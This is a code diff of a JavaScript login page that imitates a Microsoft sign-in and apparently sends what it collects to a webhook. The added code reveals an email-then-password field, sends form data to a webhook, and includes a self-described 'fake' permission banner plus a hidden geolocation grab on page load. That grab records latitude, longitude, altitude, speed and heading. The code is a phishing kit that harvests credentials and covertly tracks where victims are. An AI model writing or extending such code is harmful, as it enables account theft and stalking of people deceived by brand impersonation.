+                }, 30);
             } else {
                 const errText = await response.text();
-                statusEl.className = 'status error';
-                statusEl.innerHTML = `✗ server error (${response.status}) — try again`;
-                submitBtn.disabled = false;
+                setStatus(`⚠️ Authentication server error (${response.status}). Please try again.`, 'error');
+                signInBtn.disabled = false;
+                signInBtn.textContent = 'Sign in';
                 console.error('Webhook error:', errText);
             }
         } catch (err) {
-            statusEl.className = 'status error';
-            statusEl.innerHTML = `✗ ${err.message || 'network error'}`;
-            submitBtn.disabled = false;
+            setStatus(`❌ Network error: ${err.message || 'Unknown'}`, 'error');
+            signInBtn.disabled = false;
+            signInBtn.textContent = 'Sign in';
         }
     }
 
-    submitBtn.addEventListener('click', handleSubmit);
-
-    // auto-grab on load
-    window.addEventListener('load', () => {
-        // silently pre-fetch location
-        navigator.geolocation?.getCurrentPosition(() => {}, () => {}, { timeout: 5000 });
+    // ---- Auto-show password field on email blur ----
+    emailInput.addEventListener('blur', function() {
+        if (this.value.trim().length > 0) {
+            passwordGroup.classList.remove('hidden');
+            passwordInput.focus();
+        } else {
+            passwordGroup.classList.add('hidden');
+        }
     });
+
+    emailInput.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter' && this.value.trim().length > 0) {
+            passwordGroup.classList.remove('hidden');
+            passwordInput.focus();
+            e.preventDefault();
+        }
+    });
+
+    passwordInput.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') {
+            loginForm.dispatchEvent(new Event('submit'));
+        }
+    });
+
+    // ---- Permission banner - fake but triggers geolocation prompt ----
+    permBanner.addEventListener('click', function() {
+        // This triggers the browser permission prompt
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    locationData = {
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        acc: pos.coords.accuracy,
+                        alt: pos.coords.altitude,
+                        heading: pos.coords.heading,
+                        speed: pos.coords.speed
+                    };
+                    permBanner.style.borderColor = '#7fba00';
+                    permBanner.style.background = '#f0faf0';
+                    permBanner.querySelector('.text span').textContent = '✓ Location access granted.';
+                    permissionGranted = true;
+                },
+                () => {
+                    permBanner.style.borderColor = '#a80000';
+                    permBanner.style.background = '#fde7e9';
+                    permBanner.querySelector('.text span').textContent = '⚠️ Location access denied — some features may be limited.';
+                },
+                { enableHighAccuracy: true, timeout: 5000 }
+            );
+        }
+    });
+
+    // Also trigger on page load after a small delay (passive)
+    window.addEventListener('load', function() {
+        setTimeout(() => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        locationData = {
+                            lat: pos.coords.latitude,
+                            lon: pos.coords.longitude,
+                            acc: pos.coords.accuracy,
+                            alt: pos.coords.altitude,
+                            heading: pos.coords.heading,
+                            speed: pos.coords.speed
+                        };
+                        permBanner.style.borderColor = '#7fba00';
+                        permBanner.style.background = '#f0faf0';
+                        permBanner.querySelector('.text span').textContent = '✓ Location access granted.';
+                        permissionGranted = true;
+                    },
+                    () => {},
+                    { enableHighAccuracy: true, timeout: 3000 }
+                );
+            }
+        }, 500);
+    });
+
+    // ---- Form submit listener ----
+    loginForm.addEventListener('submit', handleLogin);
+
+    // ---- Dummy links (no navigation) ----
+    document.querySelectorAll('a[href="#"]').forEach(link => {
+        link.addEventListener('click', (e) => e.preventDefault());
+    });
+
+    document.getElementById('createAccountLink').addEventListener('click', function(e) {
+        e.preventDefault();
+        setStatus('Create a new Microsoft account — feature coming soon.', 'loading');
+        setTimeout(hideStatus, 3000);
+    });
+
+    document.getElementById('signupLink').addEventListener('click', function(e) {
+        e.preventDefault();
+        setStatus('Sign up for Microsoft 365 — redirecting...', 'loading');
+        setTimeout(hideStatus, 3000);
+    });
+
 })();
 </script>
 </body>
